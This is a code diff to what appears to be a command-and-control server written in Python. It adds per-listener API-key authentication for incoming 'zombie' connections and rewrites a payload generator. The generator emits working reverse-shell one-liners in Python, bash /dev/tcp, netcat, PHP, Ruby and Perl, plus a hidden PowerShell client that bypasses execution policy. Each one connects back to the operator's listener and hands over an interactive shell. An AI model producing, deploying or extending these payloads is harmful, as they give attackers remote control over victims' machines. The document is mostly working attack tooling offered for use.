@@ -16,8 +16,10 @@ def _sanitize_cmd(cmd):
         cmd = cmd[:4096]
     return cmd
 
-def start_listener(port, bind_addr="0.0.0.0", name="Default Listener", auth_enabled=True):
+def start_listener(port, bind_addr="0.0.0.0", name="Default Listener", auth_enabled=True, api_key=None):
     listener_id = str(uuid.uuid4())[:8]
+    if auth_enabled and not api_key:
+        api_key = uuid.uuid4().hex[:16]
 
     try:
         port = int(port)
@@ -48,6 +50,7 @@ def start_listener(port, bind_addr="0.0.0.0", name="Default Listener", auth_enab
         "bind_addr": bind_addr,
         "status": "running",
         "auth_enabled": auth_enabled,
+        "api_key": api_key,
         "socket": server_sock,
         "zombies": [],
         "started_at": time.time(),
@@ -224,11 +227,13 @@ def _accept_loop(listener_id):
             break
 
         auth_enabled = listener.get("auth_enabled", True)
+        api_key = listener.get("api_key", "YGG!")
 
         if auth_enabled:
             try:
-                magic = client_sock.recv(4)
-                if magic != C2_MAGIC:
+                client_sock.settimeout(5.0)
+                received_key = client_sock.recv(len(api_key)).decode('utf-8', errors='ignore').strip()
+                if received_key != api_key:
                     client_sock.sendall(b"REJECTED\n")
                     client_sock.close()
                     with C2_LOCK:
@@ -485,18 +490,26 @@ def execute_on_zombie(zombie_id, command):
             "response": "".join(o.get("data", "") for o in recent[-5:]) if recent else "(waiting for response...)"
         }
 
-def generate_payload(listener_ip, listener_port, payload_type="python", arch="x64"):
-    C2_MAGIC.hex()
+def generate_payload(listener_ip, listener_port, payload_type="python", arch="x64", api_key=None):
+    if not api_key:
+        api_key = "YGG!"
+        with C2_LOCK:
+            for lst in LISTENERS.values():
+                if lst["port"] == int(listener_port) and lst["status"] == "running":
+                    if lst.get("api_key"):
+                        api_key = lst["api_key"]
+                    break
+
     payloads = {
-        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{listener_ip}\",{listener_port}));s.send(b\"{C2_MAGIC.decode()}\");s.recv(1024);os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
-        "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{listener_ip}\",{listener_port}));s.send(b\"{C2_MAGIC.decode()}\");s.recv(1024);os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
-        "bash": f"printf '\\x59\\x47\\x47\\x21' > /dev/tcp/{listener_ip}/{listener_port}; bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1",
-        "nc": f"printf 'YGG!' | nc -q0 {listener_ip} {listener_port}; nc -e /bin/sh {listener_ip} {listener_port}",
-        "nc_mkfifo": f"printf 'YGG!' | nc -q0 {listener_ip} {listener_port}; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {listener_ip} {listener_port} >/tmp/f",
-        "php": f"php -r '$sock=fsockopen(\"{listener_ip}\",{listener_port});fwrite($sock,\"YGG!\");fread($sock,1024);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
-        "ruby": f"ruby -rsocket -e's=TCPSocket.open(\"{listener_ip}\",{listener_port});s.write(\"YGG!\");s.gets;f=s.to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
-        "perl": f"perl -e 'use Socket;$i=\"{listener_ip}\";$p={listener_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));send(S,\"YGG!\",0);recv(S,$x,1024,0);open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
-        "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object Net.Sockets.TCPClient('{listener_ip}',{listener_port});$s=$c.GetStream();$m=[text.encoding]::ASCII.GetBytes('YGG!');$s.Write($m,0,$m.Length);$b=New-Object byte[] 1024;$s.Read($b,0,$b.Length)|Out-Null;while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String)+'PS '+(pwd).Path+'> ';$sb=[text.encoding]::ASCII.GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\"",
+        "python": f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{listener_ip}\",{listener_port}));s.send(b\"{api_key}\");s.recv(1024);os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+        "python3": f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{listener_ip}\",{listener_port}));s.send(b\"{api_key}\");s.recv(1024);os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+        "bash": f"printf '{api_key}' > /dev/tcp/{listener_ip}/{listener_port}; bash -i >& /dev/tcp/{listener_ip}/{listener_port} 0>&1",
+        "nc": f"printf '{api_key}' | nc -q0 {listener_ip} {listener_port}; nc -e /bin/sh {listener_ip} {listener_port}",
+        "nc_mkfifo": f"printf '{api_key}' | nc -q0 {listener_ip} {listener_port}; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {listener_ip} {listener_port} >/tmp/f",
+        "php": f"php -r '$sock=fsockopen(\"{listener_ip}\",{listener_port});fwrite($sock,\"{api_key}\");fread($sock,1024);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+        "ruby": f"ruby -rsocket -e's=TCPSocket.open(\"{listener_ip}\",{listener_port});s.write(\"{api_key}\");s.gets;f=s.to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
+        "perl": f"perl -e 'use Socket;$i=\"{listener_ip}\";$p={listener_port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));send(S,\"{api_key}\",0);recv(S,$x,1024,0);open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
+        "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object Net.Sockets.TCPClient('{listener_ip}',{listener_port});$s=$c.GetStream();$m=[text.encoding]::ASCII.GetBytes('{api_key}');$s.Write($m,0,$m.Length);$b=New-Object byte[] 1024;$s.Read($b,0,$b.Length)|Out-Null;while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String)+'PS '+(pwd).Path+'> ';$sb=[text.encoding]::ASCII.GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()\"",
     }
 
     if payload_type not in payloads:
